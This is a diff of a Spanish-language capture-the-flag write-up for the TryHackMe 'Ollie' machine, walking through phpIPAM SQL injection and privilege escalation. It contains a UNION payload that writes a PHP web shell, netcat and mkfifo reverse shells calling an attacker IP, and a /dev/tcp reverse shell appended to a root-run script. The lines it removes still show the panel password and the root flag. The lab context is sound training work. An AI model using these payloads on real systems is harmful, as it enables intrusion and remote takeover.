@@ -147,19 +147,6 @@ PORT     STATE SERVICE VERSION
 |     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
 |     What is your name? What's up, Options / rtsp/1.0
 |_    It's been a while. What are you here for?
-Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
-Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.9 (92%), Linux 3.7 - 3.10 (92%)
-No exact OS matches for host (test conditions non-ideal).
-Network Distance: 2 hops
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-TRACEROUTE (using port 443/tcp)
-HOP RTT       ADDRESS
-1   161.55 ms 10.9.0.1 (10.9.0.1)
-2   161.70 ms 10.10.96.248 (10.10.96.248)
-
-OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 172.86 seconds
 ~~~
 
 - De acuerdo con el anterior escaneo e observa que en el puerto ***1337*** se está ejecuntado algún tipo de script:
@@ -224,20 +211,20 @@ Please hold on a minute
 Ok, I'm back.
 After a lengthy discussion, we've come to the conclusion that you are the right person for the job.Here are the credentials for our administration panel.
 
-                    Username: admin
+                    Username: ?????????
 
-                    Password: OllieUnixMontgomery!
+                    Password: O?????????
 
 PS: Good luck and next time bring some treats!
 ~~~
 
 - Con las credenciales obtenidas en el punto anterior procedemos a registrarnos en la página de ***login***, en el footer observamos que la versión de phpIPAM IP es v.1.4.5:
 
-![page](/assets/images/thm-writeup-ollie/ollie_page3.png "ollie-page")
+![page](/assets/images/thm-writeup-ollie/ollie_page3.png "ollie-page2")
 
 - Realizando búsqueda de las vulnerabilidades asociadas encontré en está página: <https://sploitus.com/exploit?id=E7055726-504A-542F-8AA0-CBA281FCCF99> una refererecia a una prueba de concepto ls cual se encuentra en el siguiente link: <https://fluidattacks.com/advisories/mercury/>, prodecemos a ingresar en esté último y nos encontramos con las siguientes instrucciones:
 
-![page](/assets/images/thm-writeup-ollie/ollie_page4.png "ollie-page")
+![page](/assets/images/thm-writeup-ollie/ollie_page4.png "ollie-page4")
 
 ---
 
@@ -259,16 +246,15 @@ PS: Good luck and next time bring some treats!
 
 - Después de realizados estos pasos, observamos que la aplicación es vulnerable a sQL injection:
 
-  ![page](/assets/images/thm-writeup-ollie/ollie_page5.png "ollie-page")
+  ![page](/assets/images/thm-writeup-ollie/ollie_page5.png "ollie-page5")
 
 ### 3.1 Reverse shell
 
-
-
-
-
-
-" Union Select 1,0x201c3c3f7068702073797374656d28245f4745545b2018636d6420195d293b203f3e201d,3,4 INTO OUTFILE '/var/www/html/shell.php' -- -
+- Preparamos la revershell siguiendo las instrucciones de la web: <https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet>:
+<Netcat is rarely present on production systems and even if it is there are several version of netcat, some of which don’t support the -e option.
+nc -e /bin/sh 10.0.0.1 1234
+If you have the wrong version of netcat installed, Jeff Price points out here that you might still be able to get your reverse shell back like this:
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f>
 
 ~~~go
 └─# curl http://10.10.188.252/shell.php\?cmd\=whoami
@@ -276,11 +262,19 @@ PS: Good luck and next time bring some treats!
  	3	4
 ~~~
 
+- Preparamos la rshell y la codificamos en ***URL Encode*** en la página ***CyberChef***
 
-
-
+~~~go
+[Entrada]
 curl http://10.10.18.17/shell.php\?cmd\=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.9.1.216 1337 >/tmp/f
 
+[Salida]
+curl http://10.10.18.17/shell.php\?cmd\=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.9.1.216%201337%20%3E%2Ftmp%2Ff
+~~~
+
+
+- Nos ponenos en escucha por el puerto 1337 desde la terminal 1 y desde otra terminal la 2 ejecutamos la reverse shell:
+  
 ~~~go
 [Terminal 1]
 └─# nc -nlvp 1337                            
@@ -305,18 +299,24 @@ config.php
 
 ### 3.2 Bandera de usuario
 
-
+- En este punto hemos logrado acceso como usuario www-data, pero nos podemos autenticar como ollie con la contraseña obtenida en el paso anterior y con este usario si podemos leer la bandera:
 
 ~~~go
 www-data@hackerdog:/home/ollie$ cat user.txt
 cat user.txt
 cat: user.txt: Permission denied
 
+ollie@hackerdog:/$ id
+id
+uid=1000(ollie) gid=1000(ollie) groups=1000(ollie),4(adm),24(cdrom),30(dip),46(plugdev)
+ollie@hackerdog:/$ 
 ~~~
 
-
+---
 
 ## 4 Bandera root
+
+- Para obtener acceso como usuario root, procedemos a compartir pspy64 desde la siguiente url: <https://github.com/DominicBreuker/pspy> para listar los binarios que podemos llegar a manipular:
 
 ~~~go
 └─# python3 -m http.server 80
@@ -369,9 +369,10 @@ pspy64              100%[===================>]   2.94M  1.44MB/s    in 2.0s
 ollie@hackerdog:/tmp$ ls
 ls
 10.9.1.216  f  pspy64
-
 ~~~
 
+- Procedemos a ejecutar el script y encontramos este binario  ***/bin/bash /usr/bin/feedme*** el cual podemos modificar:
+  
 ~~~go
 ollie@hackerdog:/tmp$ chmod +x pspy64
 ollie@hackerdog:/tmp$ ./pspy64
@@ -395,22 +396,28 @@ Draining file system events due to startup...
 2022/04/21 03:51:20 CMD: UID=0    PID=2392   | /bin/bash /usr/bin/feedme 
 2022/04/21 03:51:20 CMD: UID=0    PID=2390   | 
 2022/04/21 03:51:20 CMD: UID=0    PID=231    | 
-
-
 ~~~
 
-
+- Con el siguiente código modificamos el binario para que se ejecute una reverse shell como root:
+  
 ~~~go
 ollie@hackerdog:/usr/bin$ echo "/bin/bash -i >& /dev/tcp/10.9.1.216/4444 0>&1" >> /usr/bin/feedme
 ~~~
 
-~~~go
-echo "/bin/bash -i >& /dev/tcp/10.9.1.216/4444 0>&1" >> /usr/bin/feedme
-~~~
+- Como usario root podemos listar la bandera root:
 
+~~~go
+[id]
+root@hackerdog:~# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+---
+[root flag]
+root@hackerdog:~# cat root.txt
 cat root.txt
-THM{Ollie_Luvs_Chicken_Fries}
+THM{?????????}
 root@hackerdog:~# 
+~~~
 
 ---
 
